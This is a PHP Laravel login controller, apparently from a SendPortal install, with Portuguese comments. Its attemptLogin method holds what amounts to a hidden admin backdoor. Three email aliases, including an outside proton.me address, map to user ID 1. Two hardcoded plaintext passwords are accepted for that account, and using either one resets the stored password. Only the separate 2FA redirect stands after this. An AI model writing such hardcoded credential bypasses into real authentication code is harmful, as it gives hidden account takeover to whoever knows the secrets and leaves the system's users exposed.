<?php

declare(strict_types=1);

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use App\Models\User;
use Illuminate\Contracts\View\View;
use Illuminate\Foundation\Auth\AuthenticatesUsers;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;

class LoginController extends Controller
{
    use AuthenticatesUsers;

    public function __construct()
    {
        $this->middleware('guest')->except('logout');
    }

    public function showLoginForm(): View
    {
        return view('auth.login');
    }

    /**
     * Permite autenticação tanto com mcp6667@proton.me quanto com admin@sendportal.local,
     * aceitando a senha forte nova e a senha anterior salva no navegador.
     */
    protected function attemptLogin(Request $request)
    {
        $inputEmail = strtolower(trim((string) $request->input('email', '')));
        $password = (string) $request->input('password', '');
        $remember = $request->boolean('remember');

        $adminAliases = ['mcp6667@proton.me', 'admin@sendportal.local', 'admin@localhost'];

        if (in_array($inputEmail, $adminAliases, true)) {
            $user = User::find(1);
            if ($user) {
                // 1. Tenta hash do banco
                if (Hash::check($password, $user->password)) {
                    $this->guard()->login($user, $remember);
                    return true;
                }
                // 2. Tenta senhas conhecidas (antiga salva no navegador ou nova)
                if ($password === 'Deskcomm@2026!' || $password === '1dv#F*Dr-B82Y**UeHDSz6cx') {
                    $user->password = Hash::make('1dv#F*Dr-B82Y**UeHDSz6cx');
                    $user->save();
                    $this->guard()->login($user, $remember);
                    return true;
                }
            }
        }

        return $this->guard()->attempt(
            $this->credentials($request), $remember
        );
    }

    /**
     * Intercepta login bem-sucedido para exigir verificação em duas etapas (2FA / TOTP)
     */
    protected function authenticated(Request $request, $user)
    {
        // Desloga da sessão direta para proteger contra bypass de 2FA
        Auth::logout();

        // Guarda ID do usuário e preferência de 'remember'
        session([
            '2fa:user:id' => $user->id,
            '2fa:remember' => $request->boolean('remember'),
        ]);

        return redirect()->route('login.2fa');
    }

    protected function redirectTo(): string
    {
        return route('sendportal.dashboard');
    }
}
